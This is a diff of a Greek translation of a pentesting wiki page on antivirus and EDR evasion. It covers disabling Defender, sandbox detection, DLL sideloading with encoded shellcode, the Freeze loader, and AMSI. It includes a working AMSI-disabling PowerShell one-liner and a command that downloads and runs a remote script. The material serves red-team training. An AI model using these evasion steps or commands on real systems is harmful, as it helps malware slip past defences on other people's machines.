@@ -1,93 +1,93 @@
-# Antivirus (AV) Bypass
+# Παράκαμψη Antivirus (AV)
 
 {{#include ../banners/hacktricks-training.md}}
 
 **Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
-## Stop Defender
+## Απενεργοποίηση Defender
 
-- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί.
-- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί προσποιούμενο άλλο AV.
+- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο που σταματά το Windows Defender από το να λειτουργεί.
+- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο που σταματά το Windows Defender από το να λειτουργεί προσποιούμενο άλλο AV.
 - [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
 
 ## **AV Evasion Methodology**
 
-Αυτή τη στιγμή, τα AV χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση, και για τα πιο προηγμένα EDRs, ανάλυση συμπεριφοράς.
+Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προχωρημένα EDRs, behavioural analysis.
 
 ### **Static detection**
 
-Η στατική ανίχνευση επιτυγχάνεται με την επισήμανση γνωστών κακόβουλων συμβολοσειρών ή πινάκων byte σε ένα δυαδικό ή σενάριο, και επίσης με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, έλεγχος ακεραιότητας, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σας πιάσει πιο εύκολα, καθώς πιθανότατα έχουν αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος ανίχνευσης:
+Η στατική ανίχνευση επιτυγχάνεται σηματοδοτώντας γνωστά κακόβουλα strings ή arrays bytes σε ένα binary ή script, καθώς και εξαγάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σε κάνει να εντοπιστείς πιο εύκολα, καθώς πιθανώς έχουν ήδη αναλυθεί και σηματοδοτηθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να αποφύγεις αυτό το είδος ανίχνευσης:
 
 - **Encryption**
 
-Αν κρυπτογραφήσετε το δυαδικό, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμα σας, αλλά θα χρειαστείτε κάποιο είδος φορτωτή για να αποκρυπτογραφήσετε και να εκτελέσετε το πρόγραμμα στη μνήμη.
+  Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιο loader για να αποκρυπτογραφήσεις και να τρέξεις το πρόγραμμα στη μνήμη.
 
 - **Obfuscation**
 
-Μερικές φορές το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικές συμβολοσειρές στο δυαδικό ή σενάριο σας για να το περάσετε από το AV, αλλά αυτό μπορεί να είναι μια χρονοβόρα εργασία ανάλογα με το τι προσπαθείτε να αποκρύψετε.
+  Κάποιες φορές αρκεί να αλλάξεις μερικά strings στο binary ή script προκειμένου να περάσει από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.
 
 - **Custom tooling**
 
-Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.
+  Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχει γνωστή κακή υπογραφή, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.
 
 > [!TIP]
-> Ένας καλός τρόπος για να ελέγξετε την στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά τμήματα και στη συνέχεια ζητά από τον Defender να σαρώσει το καθένα ξεχωριστά, με αυτόν τον τρόπο, μπορεί να σας πει ακριβώς ποιες είναι οι επισημασμένες συμβολοσειρές ή bytes στο δυαδικό σας.
+> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
 
-Σας προτείνω να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με την πρακτική αποφυγή AV.
+Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.
 
 ### **Dynamic analysis**
 
-Η δυναμική ανάλυση είναι όταν το AV εκτελεί το δυαδικό σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπαθώντας να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς πρόσβασης του προγράμματος περιήγησης σας, εκτελώντας ένα minidump στο LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο να δουλέψετε, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να παρακάμψετε τα sandbox.
+Η δυναμική ανάλυση είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις sandboxes.
 
-- **Sleep before execution** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας εξαιρετικός τρόπος για να παρακάμψετε την δυναμική ανάλυση του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν τα αρχεία ώστε να μην διαταράξουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων ύπνων μπορεί να διαταράξει την ανάλυση των δυαδικών. Το πρόβλημα είναι ότι πολλά sandbox AV μπορούν απλά να παραλείψουν τον ύπνο ανάλογα με το πώς έχει υλοποιηθεί.
-- **Checking machine's resources** Συνήθως τα Sandbox έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τη μηχανή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων, δεν θα έχει όλα υλοποιηθεί στο sandbox.
-- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να κάνετε έναν έλεγχο στο domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει, αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.
+- **Sleep before execution** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας καλός τρόπος για να παρακάμψεις τη dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σκανάρουν αρχεία ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleep μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes μπορούν απλά να παραλείψουν το sleep ανάλογα με την υλοποίησή τους.
+- **Checking machine's resources** Συνήθως τα sandboxes έχουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες των ανεμιστήρων — δεν θα υλοποιούνται τα πάντα μέσα στο sandbox.
+- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει — αν όχι, μπορείς να τερματίσεις το πρόγραμμα σου.
 
-Αποδεικνύεται ότι το όνομα υπολογιστή του Sandbox του Microsoft Defender είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα υπολογιστή στο κακόβουλο λογισμικό σας πριν από την έκρηξη, αν το όνομα ταιριάζει με το HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του defender, οπότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.
+Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείς να ελέγξεις το computer name στο malware σου πριν την εκτόξευση· αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Ορισμένες άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για να πάτε ενάντια στα Sandboxes
+Μερικές άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev κανάλι</p></figcaption></figure>
 
-Όπως έχουμε πει προηγουμένως σε αυτήν την ανάρτηση, **δημόσια εργαλεία** θα **ανιχνευθούν** τελικά, οπότε, θα πρέπει να ρωτήσετε τον εαυτό σας κάτι:
+Όπως είπαμε και πριν σε αυτό το άρθρο, τα **public tools** τελικά **θα ανιχνευτούν**, οπότε θα πρέπει να θέσεις στον εαυτό σου το εξής ερώτημα:
 
-Για παράδειγμα, αν θέλετε να κάνετε dump LSASS, **χρειάζεστε πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό έργο που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.
+Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή μπορείς να χρησιμοποιήσεις κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS.
 
-Η σωστή απάντηση είναι πιθανώς η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα πιο επισημασμένα κομμάτια κακόβουλου λογισμικού από τα AV και EDRs, ενώ το έργο αυτό είναι πολύ ωραίο, είναι επίσης ένας εφιάλτης να δουλέψετε μαζί του για να παρακάμψετε τα AV, οπότε απλά αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να επιτύχετε.
+Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανόν ένα από τα, αν όχι το πιο σηματοδοτημένο κομμάτι malware από AVs και EDRs — ενώ το project καθεαυτό είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις με αυτό για να αποφύγεις τα AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.
 
 > [!TIP]
-> Όταν τροποποιείτε τα payload σας για αποφυγή, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε αποφυγή μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε μια VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων, και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.
+> Όταν τροποποιείς τα payloads σου για evasion, φρόντισε να **απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων** στο Defender, και σε παρακαλώ, σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion μακροπρόθεσμα. Αν θες να ελέγξεις αν το payload σου ανιχνεύεται από κάποιο συγκεκριμένο AV, εγκατέστησέ το σε μια VM, προσπάθησε να απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων και δοκίμασέ το εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.
 
 ## EXEs vs DLLs
 
-Όποτε είναι δυνατόν, πάντα **προτιμήστε να χρησιμοποιείτε DLLs για αποφυγή**, από την εμπειρία μου, τα αρχεία DLL είναι συνήθως **πολύ λιγότερο ανιχνεύσιμα** και αναλυόμενα, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγετε την ανίχνευση σε ορισμένες περιπτώσεις (αν το payload σας έχει κάποιον τρόπο να εκτελείται ως DLL φυσικά).
+Όποτε είναι δυνατόν, πάντα **προτίμησε να χρησιμοποιείς DLLs για evasion**, από την εμπειρία μου, τα αρχεία DLL συνήθως **ανιχνεύονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε κάποιες περιπτώσεις (εφόσον το payload σου έχει κάποιο τρόπο να τρέξει ως DLL φυσικά).
 
-Όπως μπορούμε να δούμε σε αυτήν την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό ανίχνευσης 7/26.
+Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση του κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός απλού Havoc EXE payload vs ενός απλού Havoc DLL</p></figcaption></figure>
 
-Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο διακριτικοί.
+Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να γίνεις πολύ πιο stealthy.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας τόσο την εφαρμογή-στόχο όσο και τα κακόβουλα payloads δίπλα-δίπλα.
+**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader τοποθετώντας τόσο την εφαρμογή-θύμα όσο και το κακόβουλο payload δίπλα-δίπλα.
 
-Μπορείτε να ελέγξετε για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω script powershell:
+Μπορείς να ελέγξεις για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
 ```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-Αυτή η εντολή θα εξάγει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στον φάκελο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.
+Αυτή η εντολή θα εμφανίσει τη λίστα προγραμμάτων ευπαθών σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.
 
-Συνιστώ ανεπιφύλακτα να **εξερευνήσετε τα προγράμματα που είναι επιρρεπή σε DLL Hijackable/Sideloadable μόνοι σας**, αυτή η τεχνική είναι αρκετά διακριτική αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα Sideloadable DLL, μπορεί να σας πιάσουν εύκολα.
+Σας συνιστώ ανεπιφύλακτα να **explore DLL Hijackable/Sideloadable programs yourself**, αυτή η τεχνική είναι αρκετά stealthy αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να πιαστείτε εύκολα.
 
-Απλά τοποθετώντας μια κακόβουλη DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες λειτουργίες μέσα σε αυτή τη DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.
+Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που το πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.
 
-**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από την proxy (και κακόβουλη) DLL στην αρχική DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.
+**DLL Proxying** προωθεί τα calls που κάνει ένα πρόγραμμα από το proxy (and malicious) DLL προς το original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.
 
 Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)
 
@@ -98,26 +98,28 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική μετονομασμένη DLL.
+Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα DLL source code template και την αρχική μετονομασμένη DLL.
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
 5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
 ```
+Αυτά είναι τα αποτελέσματα:
+
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Και ο κώδικας μας (κωδικοποιημένος με [SGN](https://github.com/EgeBalci/sgn)) και η proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.
+Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Σας **συνιστώ έντονα** να παρακολουθήσετε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading και επίσης το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα έχουμε συζητήσει πιο αναλυτικά.
+> Σας **συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε πιο αναλυτικά.
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
 `Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
 
-Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε τον κώδικά σας με διακριτικό τρόπο.
+Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -127,53 +129,53 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Η αποφυγή είναι απλώς ένα παιχνίδι γάτας και ποντικιού, αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο, αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλές τεχνικές αποφυγής.
+> Η παράκαμψη ανίχνευσης είναι ένα παιχνίδι γάτας και ποντικιού — ό,τι λειτουργεί σήμερα μπορεί να ανιχνευτεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο. Αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.
 
-## AMSI (Διεπαφή Σάρωσης Κακόβουλου Λογισμικού)
+## AMSI (Anti-Malware Scan Interface)
 
-Η AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, οι AVs ήταν ικανοί να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσατε με κάποιο τρόπο να εκτελέσετε payloads **άμεσα στη μνήμη**, ο AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.
+Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στο δίσκο**, οπότε αν με κάποιον τρόπο εκτελούσατε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.
 
-Η δυνατότητα AMSI είναι ενσωματωμένη σε αυτά τα στοιχεία των Windows.
+Το χαρακτηριστικό AMSI ενσωματώνεται στα ακόλουθα στοιχεία των Windows.
 
-- Έλεγχος Λογαριασμού Χρήστη, ή UAC (ανύψωση EXE, COM, MSI ή εγκατάστασης ActiveX)
-- PowerShell (σενάρια, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
+- User Account Control, or UAC (ανύψωση EXE, COM, MSI, ή εγκατάσταση ActiveX)
+- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
 - Windows Script Host (wscript.exe και cscript.exe)
 - JavaScript και VBScript
-- Μακροεντολές VBA του Office
+- Office VBA macros
 
-Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των σεναρίων εκθέτοντας το περιεχόμενο των σεναρίων με μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη αποκρυπτογραφημένη.
+Σας επιτρέπει να ελέγχειτε τη συμπεριφορά των scripts εκθέτοντας το περιεχόμενο των scripts σε μορφή που δεν είναι κρυπτογραφημένη ή απο-οβελισμένη.
 
 Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-Παρατηρήστε πώς προσθέτει `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το σενάριο, στην προκειμένη περίπτωση, powershell.exe
+Παρατηρήστε πώς προθέτει `amsi:` και στη συνέχεια την διαδρομή προς το εκτελέσιμο από το οποίο τρέχει το script, σε αυτή την περίπτωση powershell.exe
 
-Δεν ρίξαμε κανένα αρχείο στον δίσκο, αλλά πάλι πιαστήκαμε στη μνήμη λόγω της AMSI.
+Δεν αφήσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά πιάσαμε σε μνήμη λόγω του AMSI.
 
-Επιπλέον, ξεκινώντας με **.NET 4.8**, ο κώδικας C# εκτελείται μέσω της AMSI επίσης. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για την εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως 4.7.2 ή χαμηλότερα) για την εκτέλεση στη μνήμη αν θέλετε να αποφύγετε την AMSI.
+Επιπλέον, ξεκινώντας από **.NET 4.8**, ο C# κώδικας περνάει επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση σε μνήμη. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή παλαιότερες) για εκτέλεση in-memory αν θέλετε να αποφύγετε το AMSI.
 
-Υπάρχουν μερικοί τρόποι για να παρακάμψετε την AMSI:
+Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:
 
-- **Αποκρυπτογράφηση**
+- **Obfuscation**
 
-Δεδομένου ότι η AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, επομένως, η τροποποίηση των σεναρίων που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.
+Δεδομένου ότι το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.
 
-Ωστόσο, η AMSI έχει τη δυνατότητα να αποκρυπτογραφεί σενάρια ακόμη και αν έχει πολλαπλά επίπεδα, οπότε η αποκρυπτογράφηση μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό το καθιστά όχι και τόσο απλό να αποφευχθεί. Αν και, μερικές φορές, το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.
+Ωστόσο, το AMSI έχει τη δυνατότητα να απο-οβελίζει scripts ακόμη και αν έχουν πολλαπλά επίπεδα obfuscation, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό την καθιστά όχι και τόσο αυτονόητη για παράκαμψη. Αν και, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξετε μερικά variable names και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.
 
-- **Παράκαμψη AMSI**
+- **AMSI Bypass**
 
-Δεδομένου ότι η AMSI υλοποιείται φορτώνοντας μια DLL στη διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να παρέμβετε σε αυτήν εύκολα ακόμη και εκτελώντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση της AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν την ανίχνευση της AMSI.
+Εφόσον το AMSI υλοποιείται με τη φόρτωση ενός DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe κ.λπ.), είναι δυνατό να χειραγωγηθεί εύκολα ακόμη και τρέχοντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να παρακάμψουν το AMSI scanning.
 
-**Εξαναγκασμός Σφάλματος**
+**Forcing an Error**
 
-Η εξαναγκασμένη αποτυχία της αρχικοποίησης AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει τη μεγαλύτερη χρήση.
+Αναγκάζοντας την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
